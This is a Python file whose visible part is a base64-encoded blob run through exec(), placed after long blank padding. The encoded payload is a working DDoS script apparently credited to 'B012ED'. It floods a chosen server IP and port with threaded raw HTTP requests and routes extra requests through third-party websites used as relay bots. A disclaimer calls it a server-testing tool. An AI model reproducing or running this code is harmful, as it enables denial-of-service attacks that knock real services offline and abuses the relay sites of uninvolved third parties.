# Scrypt By YUSA
# YT B012ED
import base64

import marshal,zlib,base64
#exec(marshal.loads('https://b012ed.github.io')
#zlib&base32&marshal"exec(marshal.load('HgHhbjggTfghUggUgffUhghJhhIbbiGgtGfghHhhuHhjiiBbjjBbhgGggGggTrdFdeSddssGhHhhOjbKinjIjbjIhhhHhggHghhUyggGggggGgggHhGTTTyhhfDdsHjiJiGgjJvvJujGjuHgDdRrgYyyUu')







































































































































































































































































































exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24zCiMgLSotIGNvZGluZzogdXRmLTggLSotCgojIHB5dGhvbiAzIERkb3MtQXR0YWNrIFNjcmlwdCB2LjEKIyBieSBCMDEyRUQKIyBvbmx5IGZvciBsZWdhbCBwdXJwb3NlCgppbXBvcnQgb3MsdGltZSxzeXMsc2h1dGlsLGl0ZXJ0b29scyx0aHJlYWRpbmcscmFuZG9tCmZyb20gcXVldWUgaW1wb3J0IFF1ZXVlCmZyb20gb3B0cGFyc2UgaW1wb3J0IE9wdGlvblBhcnNlcgppbXBvcnQgdGltZSxzeXMsc29ja2V0LHRocmVhZGluZyxsb2dnaW5nLHVybGxpYi5yZXF1ZXN0LHJhbmRvbQoKZGVmIHl1c2Eocyk6CiAgICBmb3IgYyBpbiBzICsgJ1xuJzoKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGMpCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgdGltZS5zbGVlcChyYW5kb20ucmFuZG9tKCkgKiAwLjAxKQp5dXNhKCdpbXBvcnQgZGF0YSBmcm9tIDonKQpkb25lID0gRmFsc2UKCmRlZiBhbmltYXRlKCk6CiAgICBmb3IgYyBpbiBpdGVydG9vbHMuY3ljbGUoWydcMDMzWzM0OzFtfCcsICcvJywgJy0nLCAnXFxcMDMzWzAwbSddKToKICAgICAgICBpZiBkb25lOgogICAgICAgICAgICBicmVhawogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoJ1xybG9hZGluZyAnICsgYykKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKDAuMSkKdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWFuaW1hdGUpCnQuc3RhcnQoKQoKdGltZS5zbGVlcCgxMCkKZG9uZSA9IFRydWUKCnl1c2EoIlxuXDAzM1swMG1cdFwwMzNbNDE7MW0gaHR0cDovL2IwMTJlZC5naXRodWIuaW8gXDAzM1swMG0iKQoKeXVzYSgiIiJcMDMzWzM0OzFtCiAgICDilI/ilJMg4pSP4pSB4pST4pSP4pSB4pST4pSP4pSB4pW44pW64pSz4pST4pK4CiAgICDilKPilLvilJPilIMg4pSD4pSj4pSz4pSb4pSj4pW4ICDilIPilIMgXDAzM1s5NjsxbURkb3NcMDMzWzAwbQogXDAzM1s5NjsxbSAgIOKUl+KUgeKUm+KUl+KUgeKUm+KVueKUl+KVuOKUl+KUgeKVuOKVuuKUu+KUm1wwMzNbMDBtCiBcMDMzWzM0OzFtICAgY29weXJpZ2h0IDIwMjEgXDAzM1s5NjsxbVYxXDAzM1swMG0iIiIpCmRvbmUgPSBGYWxzZQpvcy5zeXN0ZW0oImRhdGUiKQpwcmludCAoIlwwMzNbMTszNG3igKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKJcbiIpCgpkZWYgdXNlcl9hZ2VudCgpOgoJZ2xvYmFsIHVhZ2VudAoJdWFnZW50PVtdCgl1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4wKSBPcGVyYSAxMi4xNCIpCgl1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IGk2ODY7IHJ2OjI2LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMjYuMCIpCgl1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCB4ODZfNjQ7IGVuLVVTOyBydjoxLjkuMS4zKSBHZWNrby8yMDA5MDkxMyBGaXJlZm94LzMuNS4zIikKCXVhZ2VudC5hcHBlbmQoIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDYuMTsgZW47IHJ2OjEuOS4xLjMpIEdlY2tvLzIwMDkwODI0IEZpcmVmb3gvMy41LjMgKC5ORVQgQ0xSIDMuNS4zMDcyOSkiKQoJdWFnZW50LmFwcGVuZCgiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4yKSBBcHBsZVdlYktpdC81MzUuNyAoS0hUTUwsIGxpa2UgR2Vja28pIENvbW9kb19EcmFnb24vMTYuMS4xLjAgQ2hyb21lLzE2LjAuOTEyLjYzIFNhZmFyaS81MzUuNyIpCgl1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoV2luZG93czsgVTsgV2luZG93cyBOVCA1LjI7IGVuLVVTOyBydjoxLjkuMS4zKSBHZWNrby8yMDA5MDgyNCBGaXJlZm94LzMuNS4zICguTkVUIENMUiAzLjUuMzA3MjkpIikKCXVhZ2VudC5hcHBlbmQoIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDYuMTsgZW4tVVM7IHJ2OjEuOS4xLjEpIEdlY2tvLzIwMDkwNzE4IEZpcmVmb3gvMy41LjEiKQoJcmV0dXJuKHVhZ2VudCkKCgpkZWYgbXlfYm90cygpOgoJZ2xvYmFsIGJvdHMKCWJvdHM9W10KCWJvdHMuYXBwZW5kKCJodHRwOi8vZXNzZW50aWFsdG91cnMuY29tL2NoZWNrP3VybD0iKQoJYm90cy5hcHBlbmQoImh0dHA6Ly9zYXZhbmFjbG91ZC5jb20vIikKCXJldHVybihib3RzKQoKCmRlZiBib3RfRGRvcyh1cmwpOgoJdHJ5OgoJCXdoaWxlIFRydWU6CgkJCXJlcSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4odXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsaGVhZGVycz17J1VzZXItQWdlbnQnOiByYW5kb20uY2hvaWNlKHVhZ2VudCl9KSkKCQkJcHJpbnQoIlwwMzNbOTRtYm90IGlzIGF0dGFjay4uLlwwMzNbMG0iKQoJCQl0aW1lLnNsZWVwKC4xKQoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoLjEpCgoKZGVmIGRvd25faXQoaXRlbSk6Cgl0cnk6CgkJd2hpbGUgVHJ1ZToKCQkJcGFja2V0ID0gc3RyKCJHRVQgLyBIVFRQLzEuMVxuSG9zdDogIitob3N0KyJcblxuIFVzZXItQWdlbnQ6ICIrcmFuZG9tLmNob2ljZSh1YWdlbnQpKyJcbiIrZGF0YSkuZW5jb2RlKCd1dGYtOCcpCgkJCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCgkJCXMuY29ubmVjdCgoaG9zdCxpbnQocG9ydCkpKQoJCQlpZiBzLnNlbmR0byggcGFja2V0LCAoaG9zdCwgaW50KHBvcnQpKSApOgoJCQkJcy5zaHV0ZG93bigxKQoJCQkJcHJpbnQgKCJcMDMzWzk3bSIsdGltZS5jdGltZSh0aW1lLnRpbWUoKSksIlwwMzNbMG0gXDAzM1s5NG0uL0Rkb3MtQXR0YWNrIFwwMzNbMG0iKQoJCQllbHNlOgoJCQkJcy5zaHV0ZG93bigxKQoJCQkJcHJpbnQoIlwwMzNbOTFtIFNodXREb3duXDAzM1swbSIpCgkJCXRpbWUuc2xlZXAoLjEpCglleGNlcHQgc29ja2V0LmVycm9yIGFzIGU6CgkJcHJpbnQoIlwwMzNbOTFtTm8gQ29ubmVjdGlvbiEgU2VydmVyRG93blwwMzNbMG0iKQoJCSNwcmludCgiXDAzM1s5MW0iLGUsIlwwMzNbMG0iKQoJCXRpbWUuc2xlZXAoLjEpCgoKZGVmIGRvcygpOgoJd2hpbGUgVHJ1ZToKCQlpdGVtID0gcS5nZXQoKQoJCWRvd25faXQoaXRlbSkKCQlxLnRhc2tfZG9uZSgpCgoKZGVmIGRvczIoKToKCXdoaWxlIFRydWU6CgkJaXRlbT13LmdldCgpCgkJYm90X0Rkb3MocmFuZG9tLmNob2ljZShib3RzKSsiaHR0cDovLyIraG9zdCkKCQl3LnRhc2tfZG9uZSgpCgoKZGVmIHVzYWdlKCk6Cgl5dXNhKCcnJ1wwMzNbMTs5Nm3igKJcMDMzWzE7MzRtIEREb3MtQXR0YWNrIFNjcmlwdCB2LjEgaHR0cDovL2IwMTJlZC5naXRodWIuaW8KXDAzM1sxOzk2beKAoiBcMDMzWzE7MzRtRG9uJ3QgYWJ1c2UgQWxsIHJpc2tzIGFyZSBib3JuZSBieSB0aGUgdXNlci4KXDAzM1sxOzk2beKAoiBcMDMzWzE7MzRtSXQgaXMganVzdCBmb3Igc2VydmVyIHRlc3Rpbmcgc2NyaXB0LiBZb3VyIGlwIGlzIHZpc2libGUuIFxuClwwMzNbMTs5Nm3igKJcMDMzWzE7MzRtIHVzYWdlIDogcHl0aG9uMyBEZG9zLnB5IFstc10gWy1wXSBbLXRdCiAgIFstaF0gOiBoZWxwCiAgIFstc10gOiBzZXJ2ZXIgaXAKICAgWy1wXSA6IHBvcnQgZGVmYXVsdCA4MAogICBbLXRdIDogdHVyYm8gZGVmYXVsdCAxMzUgXG5cMDMzWzBtJycnKQoJc3lzLmV4aXQoKQoKCmRlZiBnZXRfcGFyYW1ldGVycygpOgoJZ2xvYmFsIGhvc3QKCWdsb2JhbCBwb3J0CglnbG9iYWwgdGhyCglnbG9iYWwgaXRlbQoJb3B0cCA9IE9wdGlvblBhcnNlcihhZGRfaGVscF9vcHRpb249RmFsc2UsZXBpbG9nPSJEZG9zIikKCW9wdHAuYWRkX29wdGlvbigiLXEiLCItLXF1aWV0IiwgaGVscD0ic2V0IGxvZ2dpbmcgdG8gRVJST1IiLGFjdGlvbj0ic3RvcmVfY29uc3QiLCBkZXN0PSJsb2dsZXZlbCIsY29uc3Q9bG9nZ2luZy5FUlJPUiwgZGVmYXVsdD1sb2dnaW5nLklORk8pCglvcHRwLmFkZF9vcHRpb24oIi1zIiwiLS1zZXJ2ZXIiLCBkZXN0PSJob3N0IixoZWxwPSJhdHRhY2sgdG8gc2VydmVyIGlwIC1zIGlwIikKCW9wdHAuYWRkX29wdGlvbigiLXAiLCItLXBvcnQiLHR5cGU9ImludCIsZGVzdD0icG9ydCIsaGVscD0iLXAgODAgZGVmYXVsdCA4MCIpCglvcHRwLmFkZF9vcHRpb24oIi10IiwiLS10dXJibyIsdHlwZT0iaW50IixkZXN0PSJ0dXJibyIsaGVscD0iZGVmYXVsdCAxMzUgLXQgMTM1IikKCW9wdHAuYWRkX29wdGlvbigiLWgiLCItLWhlbHAiLGRlc3Q9ImhlbHAiLGFjdGlvbj0nc3RvcmVfdHJ1ZScsaGVscD0iaGVscCB5b3UiKQoJb3B0cywgYXJncyA9IG9wdHAucGFyc2VfYXJncygpCglsb2dnaW5nLmJhc2ljQ29uZmlnKGxldmVsPW9wdHMubG9nbGV2ZWwsZm9ybWF0PSclKGxldmVsbmFtZSktOHMgJShtZXNzYWdlKXMnKQoJaWYgb3B0cy5oZWxwOgoJCXVzYWdlKCkKCWlmIG9wdHMuaG9zdCBpcyBub3QgTm9uZToKCQlob3N0ID0gb3B0cy5ob3N0CgllbHNlOgoJCXVzYWdlKCkKCWlmIG9wdHMucG9ydCBpcyBOb25lOgoJCXBvcnQgPSA4MAoJZWxzZToKCQlwb3J0ID0gb3B0cy5wb3J0CglpZiBvcHRzLnR1cmJvIGlzIE5vbmU6CgkJdGhyID0gMTM1CgllbHNlOgoJCXRociA9IG9wdHMudHVyYm8KCgojIHJlYWRpbmcgaGVhZGVycwpnbG9iYWwgZGF0YQpoZWFkZXJzID0gb3BlbigiaGVhZGVycy50eHQiLCAiciIpCmRhdGEgPSBoZWFkZXJzLnJlYWQoKQpoZWFkZXJzLmNsb3NlKCkKI3Rhc2sgcXVldWUgYXJlIHEsdwpxID0gUXVldWUoKQp3ID0gUXVldWUoKQoKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CglpZiBsZW4oc3lzLmFyZ3YpIDwgMjoKCQl1c2FnZSgpCglnZXRfcGFyYW1ldGVycygpCglwcmludCgiXDAzM1s5Nm0iLGhvc3QsIiBwb3J0OiAiLHN0cihwb3J0KSwiIHR1cmJvOiAiLHN0cih0aHIpLCJcMDMzWzBtXG4iKQoJeXVzYSgiXDAzM1s5NG1QbGVhc2Ugd2FpdC4uLlwwMzNbMG0iKQoJdXNlcl9hZ2VudCgpCglteV9ib3RzKCkKCXRpbWUuc2xlZXAoNSkKCXRyeToKCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoaG9zdCxpbnQocG9ydCkpKQoJCXMuc2V0dGltZW91dCgxKQoJZXhjZXB0IHNvY2tldC5lcnJvciBhcyBlOgoJCXl1c2EoIlwwMzNbOTFtY2hlY2sgc2VydmVyIGlwIGFuZCBwb3J0XDAzM1swbSIpCgkJdXNhZ2UoKQoJd2hpbGUgVHJ1ZToKCQlmb3IgaSBpbiByYW5nZShpbnQodGhyKSk6CgkJCXQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kb3MpCgkJCXQuZGFlbW9uID0gVHJ1ZSAgIyBpZiB0aHJlYWQgaXMgZXhpc3QsIGl0IGRpZXMKCQkJdC5zdGFydCgpCgkJCXQyID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZG9zMikKCQkJdDIuZGFlbW9uID0gVHJ1ZSAgIyBpZiB0aHJlYWQgaXMgZXhpc3QsIGl0IGRpZXMKCQkJdDIuc3RhcnQoKQoJCXN0YXJ0ID0gdGltZS50aW1lKCkKCQkjdGFza2luZwoJCWl0ZW0gPSAwCgkJd2hpbGUgVHJ1ZToKCQkJaWYgKGl0ZW0+MTgwMCk6ICMgZm9yIG5vIG1lbW9yeSBjcmFzaAoJCQkJaXRlbT0wCgkJCQl0aW1lLnNsZWVwKC4xKQoJCQlpdGVtID0gaXRlbSArIDEKCQkJcS5wdXQoaXRlbSkKCQkJdy5wdXQoaXRlbSkKCQlxLmpvaW4oKQoJCXcuam9pbigpCg=='))